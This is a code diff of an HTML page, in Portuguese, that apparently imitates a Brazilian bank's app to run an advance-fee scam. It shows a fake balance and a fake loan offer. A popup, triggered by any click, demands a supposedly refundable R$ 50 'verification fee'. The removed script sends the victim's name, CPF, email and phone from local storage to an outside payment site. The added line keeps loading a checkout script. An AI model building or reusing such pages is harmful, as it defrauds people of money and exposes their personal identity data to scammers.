-                <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: repeating-linear-gradient(45deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 2px, transparent 2px, transparent 4px); pointer-events: none; z-index: 0;"></div>
-            </div>
-            
-
-            
-            <div class="card-container" style="margin-top: 15px; margin-bottom: 0px;">
-                <div class="card-info">
-                    <div class="card-limit" style="display: flex; justify-content: space-between; margin-bottom: 12px;">
-                        <span style="font-size: 14px; font-weight: 500;">Limite disponível</span>
-                        <span style="font-size: 22px; font-weight: 700;">R$ 4.700,00</span>
-                    </div>
-                    <div class="limit-bar" style="height: 8px; background-color: rgba(255, 255, 255, 0.2); border-radius: 4px; overflow: hidden;">
-                        <div class="limit-progress" style="width: 0%; height: 100%; background-color: #ffffff; border-radius: 4px;"></div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    
-        
-        <h2 class="section-title">Últimas transações</h2>
-        <div class="transactions">
-            <div class="transaction-item">
-                <div class="transaction-icon">
-                    <i class="fas fa-exchange-alt"></i>
-                </div>
-                <div class="transaction-details">
-                    <div class="transaction-name">Depósito realizado</div>
-                    <div class="transaction-date">Hoje, 10:15</div>
-                </div>
-                <div class="transaction-amount positive">+ R$ 4.900,00</div>
-            </div>
-            
-            <div class="transaction-item" style="display: flex; justify-content: center; padding: 20px; color: #888; font-size: 14px;">
-                Não há mais transações para exibir
-            </div>
-        </div>
-        
-        <div class="offers-section">
-            <h2 class="section-title">Ofertas para você</h2>
-            
-            <div class="offer-card">
-                <div class="offer-icon">
-                    <i class="fas fa-percentage"></i>
-                </div>
-                <div class="offer-details">
-                    <div class="offer-title">Empréstimo pré-aprovado</div>
-                    <div class="offer-description">Até R$ 15.000 com as melhores taxas do mercado</div>
-                </div>
-            </div>
-            
-            <div class="offer-card">
-                <div class="offer-icon">
-                    <i class="fas fa-chart-line"></i>
-                </div>
-                <div class="offer-details">
-                    <div class="offer-title">Investimentos</div>
-                    <div class="offer-description">Comece a investir com apenas R$ 1</div>
-                </div>
-            </div>
-            
-            <div class="offer-card" style="margin-bottom: 70px;">
-                <div class="offer-icon">
-                    <i class="fas fa-gift"></i>
-                </div>
-                <div class="offer-details">
-                    <div class="offer-title">Cashback garantido</div>
-                    <div class="offer-description">5% de volta em compras no Mercado Livre</div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <footer class="bottom-menu">
-        <div class="menu-item active">
-            <i class="fas fa-home"></i>
-            <span>Início</span>
-        </div>
-        <div class="menu-item">
-            <i class="fas fa-credit-card"></i>
-            <span>Cartões</span>
-        </div>
-        <div class="menu-item">
-            <i class="fas fa-qrcode"></i>
-            <span>Pagar</span>
-        </div>
-        <div class="menu-item">
-            <i class="fas fa-ellipsis-h"></i>
-            <span>Mais</span>
-        </div>
-    </footer>
-
-    <div id="overlay" class="overlay" style="display: none;">
-        <div class="popup">
-            <div class="popup-header">
-                <h3>Leia com Atenção</h3>
-                <button class="close-btn" onclick="closePopup()">×</button>
-            </div>
-            <div class="popup-content">
-                <p>Para concluir a validação da sua conta e dar continuidade ao processo de análise da sua solicitação, é necessária a confirmação da <strong>Taxa de Verificação no valor de R$ 50,00</strong>.</p>
-                <p>Essa etapa faz parte dos procedimentos de segurança e validação cadastral adotados pela plataforma, ajudando a confirmar os dados informados e a proteger as operações realizadas em sua conta.</p>
-                <p>Mas não se preocupe: o valor de <strong>R$ 50,00 não é perdido</strong>. Após a conclusão da verificação, o montante será <strong>creditado como saldo disponível em sua conta</strong>, da mesma forma que ocorre com outras taxas reembolsáveis previstas nos termos do serviço.</p>
-                <button class="button" onclick="redirectToPayment()">Depositar Taxa de Verificação</button>
-            </div>
-        </div>
-    </div>
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Adiciona um evento de clique para todo o documento (qualquer lugar da tela)
-            document.body.addEventListener('click', function() {
-                document.getElementById('overlay').style.display = 'flex';
-            });
-        });
-        
-        function closePopup() {
-            // Previne o comportamento padrão do evento
-            event.preventDefault();
-            // Impede a propagação do evento para elementos pai
-            event.stopPropagation();
-            document.getElementById('overlay').style.display = 'none';
-        }
-    </script>
-
-<script>
-    function getUrlParams() {
-        const params = {};
-        const queryString = window.location.search;
-        const urlParams = new URLSearchParams(queryString);
-        
-        for (const [key, value] of urlParams) {
-            params[key] = value;
-        }
-        return params;
-    }
-
-    function getUTMParams() {
-        return getUrlParams();
-    }
-
-    function buildUrlWithParams(baseUrl) {
-        const params = getUrlParams();
-        const url = new URL(baseUrl, window.location.href);
-        Object.keys(params).forEach(key => {
-            url.searchParams.append(key, params[key]);
-        });
-        
-        return url.toString();
-    }
-
-    function redirectToPaymentLegacy() {
-        try {
-            const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
-            const email = localStorage.getItem('email') || '';
-            const telefone = localStorage.getItem('telefone') || '';
-            
-            const baseUrl = 'https://pay.clubevantagem.site/yOeXZKxQXKqGAQa';
-            const url = new URL(baseUrl);
-            
-            // Adicionar parâmetros do usuário
-            url.searchParams.append('name', dadosUsuario.NOME || '');
-            url.searchParams.append('document', dadosUsuario.CPF || '');
-            url.searchParams.append('email', email);
-            url.searchParams.append('telephone', telefone);
-            
-            // Adicionar parâmetros da URL atual usando a função buildUrlWithParams
-            const finalUrl = buildUrlWithParams(url.toString());
-            
-            // O problema é que document.querySelector('button') seleciona apenas o primeiro botão da página
-            // Precisamos ser mais específicos para selecionar o botão correto
-            const button = document.querySelector('.popup-content .button');
-            if (button) {
-                button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 10px;"></i>Processando pagamento';
-            } else {
-                console.error('Botão de pagamento não encontrado');
-            }
-            window.location.href = finalUrl;
-        } catch(err) {
-            console.error('Erro ao redirecionar:', err);
-            window.location.href = buildUrlWithParams('https://pay.clubevantagem.site/yOeXZKxQXKqGAQa');
-        }
-    }
-</script>    
-
-    <style>
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(5px);
-            -webkit-backdrop-filter: blur(5px);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        
-        .popup {
-            background-color: white;
-            width: 90%;
-            max-width: 400px;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
-        }
-        
-        .popup-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px 20px;
-            background-color: #820ad1;
-            color: white;
-        }
-        
-        .popup-header h3 {
-            margin: 0;
-            font-size: 18px;
-            font-weight: 600;
-        }
-        
-        .close-btn {
-            background: none;
-            border: none;
-            color: white;
-            font-size: 24px;
-            cursor: pointer;
-            padding: 0;
-            line-height: 1;
-        }
-        
-        .popup-content {
-            padding: 20px;
-        }
-        
-        .popup-content p {
-            margin-bottom: 15px;
-            font-size: 14px;
-            line-height: 1.5;
-            color: #333;
-        }
-        
-        .button {
-            display: block;
-            width: 100%;
-            padding: 12px;
-            background-color: #820ad1;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-weight: 600;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 20px;
-            transition: background-color 0.2s;
-        }
-        
-        .button:hover {
-            background-color: #2968c8;
-        }
-    </style>
-
-
-
-    
-    <style>
-        .bottom-menu {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background-color: #ffffff;
-            display: flex;
-            justify-content: space-around;
-            padding: 16px 0 12px;
-            box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
-            z-index: 100;
-            padding-bottom: 20px;
-        }
-        
-        .menu-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            font-size: 10px;
-            color: #777;
-            cursor: pointer;
-            transition: color 0.2s;
-        }
-        
-        .menu-item i {
-            font-size: 20px;
-            margin-bottom: 6px;
-        }
-        
-        .menu-item.active {
-            color: #820ad1;
-        }
-        
-        .menu-item:hover {
-            color: #820ad1;
-        }
-    </style>
-    
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Simulação de carregamento de dados
-            setTimeout(() => {
-                const ba = document.querySelector('.balance-amount');
-                if (ba) ba.textContent = 'R$ 4.900,00';
-            }, 500);
-
-            // Toggle para mostrar/esconder saldo
-            const eyeIcon = document.querySelector('.fa-eye-slash');
-            const balanceAmount = document.querySelector('.balance-amount');
-            let isHidden = false;
-
-            if (eyeIcon && balanceAmount) eyeIcon.addEventListener('click', function() {
-                if (isHidden) {
-                    balanceAmount.textContent = 'R$ 3.547,82';
-                    eyeIcon.classList.remove('fa-eye');
-                    eyeIcon.classList.add('fa-eye-slash');
-                } else {
-                    balanceAmount.textContent = 'R$ ••••••';
-                    eyeIcon.classList.remove('fa-eye-slash');
-                    eyeIcon.classList.add('fa-eye');
-                }
-                isHidden = !isHidden;
-            });
-        });
-    </script>
-
-
-  <script src="/js/checkout-nu.js"></script>
+<script src="/js/checkout-nu.js?v=3"></script><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"a2b9eb27ee5d49aba6fa55b5dc346c09","r":1}' crossorigin="anonymous"></script>
 </body></html>
